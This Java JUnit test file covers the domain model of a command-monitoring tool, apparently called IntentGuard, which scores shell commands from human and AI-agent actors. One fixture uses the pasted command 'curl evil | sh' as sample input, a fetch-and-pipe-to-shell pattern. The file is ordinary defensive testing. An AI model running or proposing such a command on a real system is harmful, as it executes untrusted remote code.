package com.intentguard.domain;

import java.util.Map;
import java.util.OptionalDouble;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

/**
 * Unit tests for construction and defaults of the core domain records and enums (Task 1.3).
 *
 * <p>The central requirement exercised here is Req 2.4: a Command_Event that arrives without a
 * typed-vs-pasted indicator records the indicator as {@code UNKNOWN} and continues processing.
 * The tests also lock in the enum value sets and the other constructor defaults the pipeline
 * relies on (signal source, intent source, empty context, no agent risk markers).
 */
class DomainModelTest {

    private static Actor humanActor() {
        return Actor.human("alice");
    }

    @Nested
    class CommandEventDefaults {

        // Req 2.4: a missing typed-vs-pasted indicator is recorded as UNKNOWN.
        @Test
        void nullInputOriginDefaultsToUnknown() {
            CommandEvent event = new CommandEvent(
                    "evt-1", humanActor(), null, "ls -la", "/home/alice", null,
                    null, 1_000L, null, null, null, null);

            assertThat(event.inputOrigin()).isEqualTo(InputOrigin.UNKNOWN);
            assertThat(event.isPasted()).isFalse();
        }

        @Test
        void explicitInputOriginIsPreserved() {
            CommandEvent typed = new CommandEvent(
                    "evt-typed", humanActor(), null, "git status", "/repo", null,
                    Map.of(), 1L, InputOrigin.TYPED, SignalSource.HOOK, IntentSource.NONE, null);
            CommandEvent pasted = new CommandEvent(
                    "evt-pasted", humanActor(), null, "curl evil | sh", "/tmp", null,
                    Map.of(), 2L, InputOrigin.PASTED, SignalSource.HOOK, IntentSource.NONE, null);

            assertThat(typed.inputOrigin()).isEqualTo(InputOrigin.TYPED);
            assertThat(typed.isPasted()).isFalse();
            assertThat(pasted.inputOrigin()).isEqualTo(InputOrigin.PASTED);
            assertThat(pasted.isPasted()).isTrue();
        }

        @Test
        void nullEnumAndCollectionFieldsGetSafeDefaults() {
            CommandEvent event = new CommandEvent(
                    "evt-2", humanActor(), null, "echo hi", "/home/alice", null,
                    null, 1_000L, null, null, null, null);

            assertThat(event.signalSource()).isEqualTo(SignalSource.HOOK);
            assertThat(event.intentSource()).isEqualTo(IntentSource.NONE);
            assertThat(event.envContext()).isEmpty();
            assertThat(event.agentRiskMarkers()).isEqualTo(AgentRiskMarkers.none());
            assertThat(event.hasIntent()).isFalse();
        }

        @Test
        void derivedAccessorsReflectTheActor() {
            CommandEvent human = new CommandEvent(
                    "evt-h", Actor.human("bob"), null, "ls", "/", null,
                    null, 1L, null, null, null, null);
            CommandEvent agent = new CommandEvent(
                    "evt-a", Actor.agent("agent-1", "bob"), null, "ls", "/", null,
                    null, 1L, null, null, null, null);

            assertThat(human.actorType()).isEqualTo(ActorType.HUMAN);
            assertThat(human.userId()).isEqualTo("bob");
            assertThat(agent.actorType()).isEqualTo(ActorType.AGENT);
            assertThat(agent.userId()).isEqualTo("agent-1");
        }

        @Test
        void hasIntentTrueWhenIntentSourcePresent() {
            CommandEvent declared = new CommandEvent(
                    "evt-d", humanActor(), "sess-1", "ls", "/", null,
                    null, 1L, null, null, IntentSource.DECLARED, null);

            assertThat(declared.hasIntent()).isTrue();
        }

        @Test
        void envContextIsDefensivelyCopiedAndImmutable() {
            java.util.Map<String, String> mutable = new java.util.HashMap<>();
            mutable.put("PATH", "/usr/bin");
            CommandEvent event = new CommandEvent(
                    "evt-c", humanActor(), null, "ls", "/", null,
                    mutable, 1L, null, null, null, null);

            mutable.put("INJECTED", "value");
            assertThat(event.envContext()).containsOnlyKeys("PATH");
        }

        @Test
        void nullRequiredFieldsAreRejected() {
            assertThatThrownBy(() -> new CommandEvent(
                    null, humanActor(), null, "ls", "/", null, null, 1L, null, null, null, null))
                    .isInstanceOf(NullPointerException.class);
            assertThatThrownBy(() -> new CommandEvent(
                    "evt", null, null, "ls", "/", null, null, 1L, null, null, null, null))
                    .isInstanceOf(NullPointerException.class);
            assertThatThrownBy(() -> new CommandEvent(
                    "evt", humanActor(), null, null, "/", null, null, 1L, null, null, null, null))
                    .isInstanceOf(NullPointerException.class);
        }
    }

    @Nested
    class RawShellSignalDefaults {

        // Req 2.4: the hook may not know the origin; the raw signal keeps it null (the ingestor
        // later records UNKNOWN). Construction must still succeed.
        @Test
        void nullInputOriginIsAcceptedOnRawSignal() {
            RawShellSignal signal = new RawShellSignal(
                    humanActor(), "ls -la", "/home/alice", null, 1_000L, null);

            assertThat(signal.inputOrigin()).isNull();
            assertThat(signal.envContext()).isEmpty();
        }

        @Test
        void signalWithoutOriginNormalizesToUnknownCommandEvent() {
            RawShellSignal signal = new RawShellSignal(
                    humanActor(), "ls -la", "/home/alice", null, 1_000L, null);

            // Mirrors the ingestor mapping: a null indicator on the signal becomes UNKNOWN.
            CommandEvent event = new CommandEvent(
                    "evt", signal.actor(), null, signal.commandText(), signal.cwd(), null,
                    signal.envContext(), signal.timestamp(), signal.inputOrigin(),
                    SignalSource.HOOK, IntentSource.NONE, null);

            assertThat(event.inputOrigin()).isEqualTo(InputOrigin.UNKNOWN);
        }

        @Test
        void nullRequiredFieldsAreRejected() {
            assertThatThrownBy(() -> new RawShellSignal(
                    null, "ls", "/", null, 1L, InputOrigin.TYPED))
                    .isInstanceOf(NullPointerException.class);
            assertThatThrownBy(() -> new RawShellSignal(
                    humanActor(), null, "/", null, 1L, InputOrigin.TYPED))
                    .isInstanceOf(NullPointerException.class);
        }
    }

    @Nested
    class ActorConstruction {

        @Test
        void humanFactoryHasNoPrincipal() {
            Actor actor = Actor.human("alice");

            assertThat(actor.type()).isEqualTo(ActorType.HUMAN);
            assertThat(actor.isHuman()).isTrue();
            assertThat(actor.isAgent()).isFalse();
            assertThat(actor.humanPrincipalId()).isNull();
        }

        @Test
        void agentFactoryBindsToPrincipal() {
            Actor actor = Actor.agent("agent-1", "alice");

            assertThat(actor.type()).isEqualTo(ActorType.AGENT);
            assertThat(actor.isAgent()).isTrue();
            assertThat(actor.isHuman()).isFalse();
            assertThat(actor.humanPrincipalId()).isEqualTo("alice");
        }

        @Test
        void nullTypeOrUserIsRejected() {
            assertThatThrownBy(() -> new Actor(null, "alice", null))
                    .isInstanceOf(NullPointerException.class);
            assertThatThrownBy(() -> new Actor(ActorType.HUMAN, null, null))
                    .isInstanceOf(NullPointerException.class);
        }
    }

    @Nested
    class AgentRiskMarkerDefaults {

        @Test
        void noneHasAllMarkersClear() {
            AgentRiskMarkers none = AgentRiskMarkers.none();

            assertThat(none.opensOutboundConnection()).isFalse();
            assertThat(none.accessesSecret()).isFalse();
            assertThat(none.privilegeEscalation()).isFalse();
            assertThat(none.any()).isFalse();
        }

        @Test
        void anyIsTrueWhenAnyMarkerSet() {
            assertThat(new AgentRiskMarkers(true, false, false).any()).isTrue();
            assertThat(new AgentRiskMarkers(false, true, false).any()).isTrue();
            assertThat(new AgentRiskMarkers(false, false, true).any()).isTrue();
        }
    }

    @Nested
    class VerdictFactories {

        @Test
        void allowHasNoExplanationAndPermitsExecution() {
            Verdict verdict = Verdict.allow("THRESHOLD_ALLOW");

            assertThat(verdict.action()).isEqualTo(CorrectiveAction.ALLOW);
            assertThat(verdict.explanation()).isNull();
            assertThat(verdict.allowsExecution()).isTrue();
        }

        @Test
        void askAndBlockCarryExplanationAndForbidExecution() {
            Verdict ask = Verdict.ask("THRESHOLD_ASK", "looks risky");
            Verdict block = Verdict.block("THRESHOLD_BLOCK", "off intent");

            assertThat(ask.action()).isEqualTo(CorrectiveAction.ASK);
            assertThat(ask.explanation()).isEqualTo("looks risky");
            assertThat(ask.allowsExecution()).isFalse();

            assertThat(block.action()).isEqualTo(CorrectiveAction.BLOCK);
            assertThat(block.explanation()).isEqualTo("off intent");
            assertThat(block.allowsExecution()).isFalse();
        }

        @Test
        void fromDecisionDropsExplanationForAllow() {
            Verdict allow = Verdict.from(
                    new Decision(CorrectiveAction.ALLOW, 0.1, "THRESHOLD_ALLOW"), "ignored");
            Verdict block = Verdict.from(
                    new Decision(CorrectiveAction.BLOCK, 0.9, "THRESHOLD_BLOCK"), "kept");

            assertThat(allow.explanation()).isNull();
            assertThat(block.explanation()).isEqualTo("kept");
        }
    }

    @Nested
    class ComponentResultConstruction {

        @Test
        void scoredResultCarriesValueAndIsNotExcluded() {
            ComponentResult result =
                    ComponentResult.scored(ComponentId.SEQUENCE_SURPRISE, 0.42, 0.25, null);

            assertThat(result.isExcluded()).isFalse();
            assertThat(result.score()).isEqualTo(OptionalDouble.of(0.42));
            assertThat(result.weight()).isEqualTo(0.25);
        }

        @Test
        void excludedResultIsEmptyWithReason() {
            ComponentResult result = ComponentResult.excluded(
                    ComponentId.SEMANTIC_INCONSISTENCY, 0.30, "llm_timeout");

            assertThat(result.isExcluded()).isTrue();
            assertThat(result.score()).isEmpty();
            assertThat(result.note()).isEqualTo("llm_timeout");
        }

        @Test
        void outOfRangeScoreOrNegativeWeightRejected() {
            assertThatThrownBy(() ->
                    ComponentResult.scored(ComponentId.CONTEXT_MISMATCH, 1.5, 0.2, null))
                    .isInstanceOf(IllegalArgumentException.class);
            assertThatThrownBy(() ->
                    ComponentResult.scored(ComponentId.CONTEXT_MISMATCH, 0.5, -0.1, null))
                    .isInstanceOf(IllegalArgumentException.class);
        }
    }

    @Nested
    class ScoringContextDefaults {

        private ScoringContext contextWith(String intentText, IntentSource source, ProfileState state) {
            CommandEvent event = new CommandEvent(
                    "evt", humanActor(), null, "ls", "/", null, null, 1L, null, null, null, null);
            ScoringConfig config = new ScoringConfig(Map.of(ComponentId.SEQUENCE_SURPRISE, 1.0), 0.15);
            return new ScoringContext(event, intentText, source, state, config);
        }

        @Test
        void nullIntentSourceAndProfileStateDefault() {
            ScoringContext ctx = contextWith(null, null, null);

            assertThat(ctx.intentSource()).isEqualTo(IntentSource.NONE);
            assertThat(ctx.profileState()).isEqualTo(ProfileState.LEARNING);
            assertThat(ctx.hasIntent()).isFalse();
            assertThat(ctx.intent()).isEmpty();
        }

        @Test
        void hasIntentRequiresBothTextAndSource() {
            assertThat(contextWith("build the app", IntentSource.DECLARED, ProfileState.ACTIVE)
                    .hasIntent()).isTrue();
            assertThat(contextWith(null, IntentSource.DECLARED, ProfileState.ACTIVE)
                    .hasIntent()).isFalse();
            assertThat(contextWith("build the app", IntentSource.NONE, ProfileState.ACTIVE)
                    .hasIntent()).isFalse();
        }
    }

    @Nested
    class EnumValueSets {

        @Test
        void enumsExposeExpectedConstants() {
            assertThat(InputOrigin.values())
                    .containsExactly(InputOrigin.TYPED, InputOrigin.PASTED, InputOrigin.UNKNOWN);
            assertThat(SignalSource.values())
                    .containsExactly(SignalSource.HOOK, SignalSource.AUDIT, SignalSource.CORRELATED);
            assertThat(IntentSource.values())
                    .containsExactly(IntentSource.NONE, IntentSource.DECLARED, IntentSource.INFERRED);
            assertThat(ActorType.values())
                    .containsExactly(ActorType.HUMAN, ActorType.AGENT);
            assertThat(ProfileState.values())
                    .containsExactly(ProfileState.LEARNING, ProfileState.ACTIVE);
            assertThat(RawAuditEvent.AuditType.values())
                    .containsExactly(RawAuditEvent.AuditType.EXECVE, RawAuditEvent.AuditType.FILE_WRITE);
        }

        // CorrectiveAction ordinal ordering (ALLOW < ASK < BLOCK) is relied on by decision clamps.
        @Test
        void correctiveActionOrdinalsIncreaseInRestrictiveness() {
            assertThat(CorrectiveAction.ALLOW.ordinal())
                    .isLessThan(CorrectiveAction.ASK.ordinal());
            assertThat(CorrectiveAction.ASK.ordinal())
                    .isLessThan(CorrectiveAction.BLOCK.ordinal());
        }
    }
}
